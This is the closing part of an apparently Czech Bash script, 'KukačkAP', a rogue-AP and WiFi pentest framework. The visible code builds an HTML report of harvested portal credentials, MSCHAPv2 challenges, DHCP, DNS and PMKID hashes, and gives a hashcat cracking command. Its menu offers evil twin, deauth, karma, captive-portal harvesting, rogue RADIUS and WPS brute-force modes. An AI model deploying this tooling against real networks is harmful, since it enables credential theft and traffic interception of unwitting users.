.stat{background:var(--sf);border:1px solid var(--br);border-radius:8px;padding:14px 20px;min-width:110px;text-align:center}
.stat .val{font-size:26px;font-weight:700}
.stat .lbl{font-size:11px;color:var(--mu);text-transform:uppercase;letter-spacing:.05em}
.stat.blue .val{color:var(--bl)}.stat.red .val{color:var(--rd)}.stat.green .val{color:var(--gr)}.stat.yellow .val{color:var(--yw)}.stat.purple .val{color:var(--pu)}
section{margin:0 28px 22px;border:1px solid var(--br);border-radius:8px;overflow:hidden}
section h2{background:var(--sf);padding:10px 16px;font-size:13px;border-bottom:1px solid var(--br);color:var(--bl)}
table{width:100%;border-collapse:collapse}
th{background:var(--sf);padding:7px 12px;text-align:left;font-size:11px;text-transform:uppercase;color:var(--mu);border-bottom:1px solid var(--br)}
td{padding:7px 12px;border-bottom:1px solid var(--br);font-family:monospace;font-size:13px}
tr:last-child td{border-bottom:none}
tr:hover td{background:rgba(255,255,255,.03)}
.tag{display:inline-block;padding:1px 7px;border-radius:3px;font-size:11px;font-weight:600}
.tag.rd{background:rgba(248,81,73,.15);color:var(--rd)}
.tag.bl{background:rgba(88,166,255,.15);color:var(--bl)}
.tag.gr{background:rgba(63,185,80,.15);color:var(--gr)}
.empty{padding:16px;color:var(--mu);text-align:center;font-style:italic}
pre{padding:12px 16px;font-size:12px;overflow-x:auto;color:var(--tx);background:var(--sf)}
footer{text-align:center;padding:18px;color:var(--mu);font-size:12px;border-top:1px solid var(--br);margin-top:8px}
'''

html_out = f'''<!DOCTYPE html>
<html lang="cs"><head><meta charset="utf-8"><title>KukačkAP Report</title>
<style>{CSS}</style></head><body>
<header>
  <h1>&#128225; KukačkAP Report</h1>
  <div class="meta">Vygenerováno: {now} &nbsp;|&nbsp; AP: <b>{esc.escape(AP_IFACE)}</b> &nbsp;|&nbsp; SSID: <b>{esc.escape(SSID)}</b> &nbsp;|&nbsp; Kanál: <b>{esc.escape(CHANNEL)}</b></div>
</header>
<div class="stats">
  {stat_card(cred_cnt, "Credentials", "red" if cred_cnt else "green")}
  {stat_card(dhcp_cnt, "DHCP klientů", "green")}
  {stat_card(dns_cnt,  "DNS dotazů",   "blue")}
  {stat_card(len(probe_lines), "Probe req.", "purple")}
  {stat_card(pmkid_cnt, "PMKID hash", "yellow" if pmkid_cnt else "green")}
</div>
'''

# Credentials section
cred_rows = []
for l in creds:
    l = l.strip()
    if not l: continue
    ts_m = re.search(r'\[([^\]]+)\]', l)
    ip_m = re.search(r'\]\s+(\d+\.\d+\.\d+\.\d+)', l)
    u_m  = re.search(r"user='([^']*)'", l)
    p_m  = re.search(r"pass='([^']*)'", l)
    if u_m:
        ts_v  = ts_m.group(1) if ts_m else '-'
        ip_v  = ip_m.group(1) if ip_m else '-'
        u_v   = esc.escape(u_m.group(1))
        p_v   = f'<span class="tag rd">{esc.escape(p_m.group(1))}</span>' if p_m else '-'
        cred_rows.append((ts_v, ip_v, f'<b>{u_v}</b>', p_v, '<span class="tag bl">portal</span>'))
    elif 'MSCHAPv2' in l or 'challenge' in l.lower():
        cred_rows.append(('-', '-', f'<code>{esc.escape(l[:80])}</code>', '-', '<span class="tag rd">wpe</span>'))

html_out += section('&#128273; Zachycené přihlašovací údaje',
    table(['Čas','IP','Uživatel','Heslo','Zdroj'], cred_rows, 'Žádné credentials'))

html_out += section('&#128187; DHCP klienti',
    table(['Čas','IP','MAC','Hostname'],
          [(esc.escape(r[0]), f'<b>{r[1]}</b>', r[2], r[3]) for r in dhcp_rows],
          'Žádné DHCP leases'))

html_out += section('&#127760; Top DNS dotazy',
    table(['Počet','Doména'],
          [(f'<span class="tag bl">{c}</span>', esc.escape(d)) for d,c in top_dns],
          'Žádné DNS dotazy'))

html_out += section('&#128246; Probe Requests — hledaná SSID',
    table(['Počet','Hledané SSID'],
          [(f'<span class="tag bl">{c}</span>', f'<b>{esc.escape(s)}</b>') for s,c in top_probes],
          'Žádné probe requests'))

if pmkid_lines:
    pmkid_content = '<pre>' + esc.escape(''.join(pmkid_lines[:50])) + '</pre>'
    pmkid_content += '<div style="padding:8px 16px;color:var(--mu);font-size:12px">hashcat -m 22000 hash.hc22000 wordlist.txt</div>'
else:
    pmkid_content = '<div class="empty">Žádné PMKID hashe</div>'
html_out += section('&#128275; PMKID / Hashcat hashe', pmkid_content)

# Files
file_rows = []
for f in sorted(glob.glob(f"{LOG_DIR}/*")):
    if os.path.isfile(f):
        sz = os.path.getsize(f)
        sz_str = f'{sz/1024:.1f} KB' if sz > 1024 else f'{sz} B'
        mtime = datetime.datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M')
        file_rows.append((f'<code>{esc.escape(os.path.basename(f))}</code>', sz_str, mtime))
html_out += section('&#128193; Soubory session', table(['Soubor','Velikost','Datum'], file_rows))

html_out += '<footer>KukačkAP &mdash; Rogue AP &amp; WiFi Lab Framework &mdash; POUZE pro autorizovaný pentest!</footer></body></html>'

with open(REPORT, 'w', encoding='utf-8') as out:
    out.write(html_out)
print(f"OK:{REPORT}")
PYEOF

    if [ $? -ne 0 ]; then
        echo "${R}[!] Chyba při generování reportu${N}"; read -p "ENTER..."; return
    fi
    local size; size=$(du -sh "$report" 2>/dev/null | awk '{print $1}')
    echo "${G}[+] Report: $report  ($size)${N}"

    for browser in xdg-open firefox chromium-browser chromium google-chrome; do
        if check_tool "$browser"; then
            if [ -n "$SUDO_USER" ] && [ "$EUID" -eq 0 ]; then
                sudo -u "$SUDO_USER" \
                    DISPLAY="$DISPLAY" WAYLAND_DISPLAY="$WAYLAND_DISPLAY" \
                    XDG_RUNTIME_DIR="$XDG_RUNTIME_DIR" \
                    DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" \
                    "$browser" "$report" &>/dev/null &
            else
                "$browser" "$report" &>/dev/null &
            fi
            echo "${G}[+] Otvírám v $browser${N}"
            break
        fi
    done
    echo; read -p "ENTER..."
}

mode_status() {
    echo "${B}═══ STATUS ═══${N}"
    echo "${Y}-- iw dev --${N}"; iw dev
    echo "${Y}-- ip $AP_IFACE --${N}"; ip addr show "$AP_IFACE" 2>/dev/null
    echo "${Y}-- procesy --${N}"
    pgrep -a hostapd 2>/dev/null || echo "  hostapd: -"
    pgrep -af "dnsmasq.*$WORK_DIR" 2>/dev/null || echo "  dnsmasq: -"
    pgrep -a mitmweb 2>/dev/null || echo "  mitmweb: -"
    pgrep -a airbase-ng 2>/dev/null || echo "  airbase-ng: -"
    pgrep -af "$WORK_DIR/portal.py" 2>/dev/null || echo "  portal: -"
    echo "${Y}-- DHCP leases --${N}"
    grep DHCPACK "$LOG_DIR/dnsmasq.log" 2>/dev/null | tail -5 || echo "  -"
    echo "${Y}-- creds --${N}"
    [ -s "$LOG_DIR/credentials.log" ] && tail -5 "$LOG_DIR/credentials.log" || echo "  -"
    [ "$TERM_CMD" = "tmux" ] && { echo; tmux list-sessions 2>/dev/null || echo "  (tmux: žádná)"; }
    echo
    read -p "ENTER..."
}

mode_install_deps() {
    echo "${B}═══ Závislosti ═══${N}"
    local pkgs=()
    for t in hostapd dnsmasq iptables iw nmcli tcpdump; do
        if check_tool "$t"; then echo "  ${G}✓${N} $t"; else echo "  ${R}✗${N} $t"; pkgs+=("$t"); fi
    done
    for t in mitmweb airbase-ng aireplay-ng python3 tmux \
              hcxdumptool hcxpcapngtool hostapd-wpe mdk4 reaver bully wash; do
        if check_tool "$t"; then echo "  ${G}✓${N} $t"; else echo "  ${Y}○${N} $t (volitelné)"; fi
    done
    if [ ${#pkgs[@]} -gt 0 ]; then
        echo "${Y}[!] Chybí: ${pkgs[*]}${N}"
        echo "    sudo apt install hostapd dnsmasq iptables iw network-manager tcpdump"
    fi
    check_tool mitmweb    || echo "${Y}[i] mitmproxy:${N} sudo apt install pipx && pipx install mitmproxy"
    check_tool airbase-ng || echo "${Y}[i] aircrack:${N} sudo apt install aircrack-ng"
    check_tool tmux       || echo "${Y}[i] tmux:${N} sudo apt install tmux"
    check_tool hcxdumptool   || echo "${Y}[i] PMKID:${N} sudo apt install hcxdumptool hcxtools"
    check_tool hostapd-wpe   || echo "${Y}[i] Rogue RADIUS:${N} sudo apt install hostapd-wpe"
    check_tool mdk4          || echo "${Y}[i] Beacon flood:${N} sudo apt install mdk4"
    check_tool reaver        || echo "${Y}[i] WPS:${N} sudo apt install reaver"
    echo
    read -p "ENTER..."
}

# === HLAVNÍ MENU (ve smyčce) ===
need_root

while true; do
    banner
    printf "${C}┌──────────────────────────────────────────────────┐${N}\n"
    printf "${C}│${N}  ${BOLD}AP módy${N}                                          ${C}│${N}\n"
    printf "${C}│${N}    ${G} 1)${N} Open AP + DHCP + NAT                        ${C}│${N}\n"
    printf "${C}│${N}    ${G} 2)${N} WPA2 AP + DHCP + NAT                        ${C}│${N}\n"
    printf "${C}│${N}    ${G} 3)${N} Open AP + plný pcap                         ${C}│${N}\n"
    printf "${C}│${N}    ${G}10)${N} WPA3-SAE AP + DHCP + NAT                   ${C}│${N}\n"
    printf "${C}│${N}    ${G}11)${N} Multi-SSID (2x SSID na jedné kartě)        ${C}│${N}\n"
    printf "${C}│${N}                                                  ${C}│${N}\n"
    printf "${C}│${N}  ${BOLD}Útoky / Pentest${N}                                  ${C}│${N}\n"
    printf "${C}│${N}    ${R} 4)${N} MITM HTTPS proxy (mitmweb)                  ${C}│${N}\n"
    printf "${C}│${N}    ${R} 5)${N} Captive Portal (credential harvester)       ${C}│${N}\n"
    printf "${C}│${N}    ${R} 6)${N} Evil Twin (clone real SSID + deauth)        ${C}│${N}\n"
    printf "${C}│${N}    ${R} 7)${N} Karma (odpovídá na všechny probe req)       ${C}│${N}\n"
    printf "${C}│${N}    ${R} 8)${N} WPA2 EAPOL handshake capture                ${C}│${N}\n"
    printf "${C}│${N}    ${R}12)${N} PMKID Capture (hcxdumptool → hashcat)      ${C}│${N}\n"
    printf "${C}│${N}    ${R}13)${N} WPA-Enterprise / Rogue RADIUS (hostapd-wpe)${C}│${N}\n"
    printf "${C}│${N}    ${R}14)${N} Beacon Flood (mdk4)                        ${C}│${N}\n"
    printf "${C}│${N}    ${R}15)${N} WPS Pixie Dust / Bruteforce (reaver/bully) ${C}│${N}\n"
    printf "${C}│${N}                                                  ${C}│${N}\n"
    printf "${C}│${N}  ${BOLD}Pasivní${N}                                          ${C}│${N}\n"
    printf "${C}│${N}    ${Y} 9)${N} 802.11 monitor (beacons/probes/deauth)      ${C}│${N}\n"
    printf "${C}│${N}    ${Y}16)${N} Channel Hopper + Probe Collector            ${C}│${N}\n"
    printf "${C}│${N}    ${Y}17)${N} Živý přehled klientů (RSSI, TX/RX, IP)     ${C}│${N}\n"
    printf "${C}│${N}                                                  ${C}│${N}\n"
    printf "${C}│${N}  ${BOLD}Servis${N}                                           ${C}│${N}\n"
    printf "${C}│${N}    ${W}18)${N} HTML Report (credentials, DNS, DHCP, pcap) ${C}│${N}\n"
    printf "${C}│${N}    ${W} n)${N} Nastavení (SSID, kanál, rozhraní)          ${C}│${N}\n"
    printf "${C}│${N}    ${W} s)${N} Status                                     ${C}│${N}\n"
    printf "${C}│${N}    ${W} d)${N} Kontrola závislostí                        ${C}│${N}\n"
    printf "${C}│${N}    ${W} k)${N} Kill / cleanup                             ${C}│${N}\n"
    printf "${C}│${N}    ${W} q)${N} Quit                                       ${C}│${N}\n"
    printf "${C}└──────────────────────────────────────────────────┘${N}\n\n"

    read -p "$(printf "%skukackap%s❯ " "$BOLD" "$N")" choice

    case "$choice" in
        1) mode_open_ap ;;
        2) mode_wpa2_ap ;;
        3) mode_pcap ;;
        4) mode_mitm ;;
        5) mode_captive_portal ;;
        6) mode_evil_twin ;;
        7) mode_karma ;;
        8) mode_handshake_capture ;;
        9) mode_monitor ;;
        10) mode_wpa3_ap ;;
        11) mode_multi_ssid ;;
        12) mode_pmkid_capture ;;
        13) mode_rogue_radius ;;
        14) mode_beacon_flood ;;
        15) mode_wps_attack ;;
        16) mode_channel_hopper ;;
        17) mode_client_overview ;;
        18) mode_html_report ;;
        n|N) mode_settings ;;
        s|S) mode_status ;;
        d|D) mode_install_deps ;;
        k|K) cleanup ;;
        q|Q) echo "${G}Konec.${N}"; exit 0 ;;
        *) echo "${R}Neplatná volba${N}"; sleep 1 ;;
    esac
done
